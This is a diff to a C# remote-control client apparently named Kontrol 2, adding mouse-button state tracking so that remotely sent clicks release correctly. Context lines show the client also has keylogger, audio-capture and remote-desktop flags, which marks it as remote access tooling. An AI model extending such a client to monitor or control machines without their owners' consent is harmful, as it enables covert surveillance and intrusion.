@@ -257,6 +257,16 @@ namespace Kontrol_2_Client
         static WasapiLoopbackCapture internalSource = null;
         static WaveInEvent audioSource = null;
         static bool remoteDesktop, runKeyLogger = false;
+
+		enum MouseState : byte
+		{
+			IDLE = 0xB0,
+			LEFT_HOLD,
+			RIGHT_HOLD,
+			MIDDLE_HOLD,
+		}
+		static MouseState currentMouseState = MouseState.IDLE;
+
         #endregion
 
         [STAThread]
@@ -429,19 +439,26 @@ namespace Kontrol_2_Client
 										// No button is held, release!
 										case 0xB0:
                                             SetCursorPos(x, y);
-                                            mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0);
-                                            mouse_event(MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
+											if (currentMouseState != MouseState.IDLE)
+                                            {
+                                                mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0);
+                                                mouse_event(MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
+												currentMouseState = MouseState.IDLE;
+                                            }
                                             break;
 										case 0xB1: // Left 
 											SetCursorPos(x, y);
                                             mouse_event(MOUSEEVENTF_LEFTDOWN, x, y, 0, 0);
+                                            currentMouseState = MouseState.LEFT_HOLD;
                                             break;
 										case 0xB2: // Right
                                             SetCursorPos(x, y);
                                             mouse_event(MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0);
+                                            currentMouseState = MouseState.RIGHT_HOLD;
                                             break;
 										case 0xB3: // Middle
-											break;
+                                            currentMouseState = MouseState.MIDDLE_HOLD;
+                                            break;
 									}
                                     //SetCursorPos(int.Parse(xsplit[2]), int.Parse(xsplit[3]));
                                     break;
